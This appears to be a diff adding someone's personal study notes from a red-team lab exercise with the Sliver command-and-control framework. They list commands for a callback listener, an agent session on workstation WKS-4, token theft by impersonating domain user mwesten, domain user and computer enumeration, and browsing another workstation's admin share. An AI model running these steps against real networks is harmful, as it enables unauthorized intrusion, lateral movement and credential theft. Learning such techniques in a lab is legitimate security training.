@@ -1,0 +1,26 @@
+ON SLIVER:
+
+-- RUN https -l 8443 (uses sliver to open listener on our device to accept a callback from agent)
+-- RUN sessions (tells us what sessions we can use/select to talk to an active agent on a computer somewhere)
+	You will see that when you type "sessions", hostname is WKS-4 and username is NT AUTHORITY\SYSTEM. This means there is an agent on WKS-4 run by the system. We can connect to this agent through the session.
+	
+ -- RUN use 201cb101-f5c7-461e-8c84-7e6216d5f0f6 (we are connecting to the agent running on WKS-4. Remember, an agent is just a payload that became a process)
+	At this point, I (sliver) have connected to a process that's running on WKS-4 by "using" a session. I can ask the process to execute my commands on WKS-4 machine
+	We tried a bunch of "ls" commands which the agent on WKS-4 runs. But we did not find anything cool, so we will now try and find if there's stuff on another WKS... Or maybe we can impersonate someone and try to login elsewhere?? 
+	
+-- RUN ps (this gives all the processes running on the current, WKS-4, computer).
+	We will see that there are some processes whose owner is PROCE\mwesten. This is good. This means that some of mwesten's processes are running on WKS-4. We also found out PROCE is the domain controller, so it has a lot of privileges. So mwesten would have a lot of privileges. Now, because mwesten's process ran on WKS-4, his token which was used to authenticate him on WKS-4 is stored somewhere. We need it. 
+	
+-- RUN impersonate PROCE\\mwesten (grabs his token!)
+	Now, we can use his token to authenticate into other computers that belong to the PROCE domain! We'll keep this token for later...
+
+-- RUN execute -o net users /domain (we are enumerating all the users being managed by the current domain controller)
+	You will see that the domain controller is a physical computer called EC2AMAZ-R3EHLMA. Its fully qualified hostname is EC2AMAZ-R3EHLMA.proce.bedge, so it is the domain controller (kind of like an SDN controller in networks) for the proce domain and maintains a list of all users under proce. We see mwesten here. That's good. We also want to find what other computers EC2AMAZ-R3EHLMA maintains. 
+
+-- RUN sa-ldapsearch '(objectClass=computer)' (will tell us other WKS computers under the PROCE domain. We will need to "read all the words" on these computers) 
+
+-- RUN ls \\\\WKS-3.proce.bedge\\c$ (give us all the files in the C: directory on the WKS3 computer)
+	-- RUN cd \\\\WKS-3.proce.bedge\\c$ (lets us actually enter that file). Again, we are able to do all of these reverse shell-like commands because sliver has a session with an agent on the WKS-4 and we've identified the names of the other computers in the domain. 
+	
+	
+NEXT TIME YOU START THIS, START FROM BEGINNING AND GET SCREENSHOTS OF COMMANDS AND OUTPUT
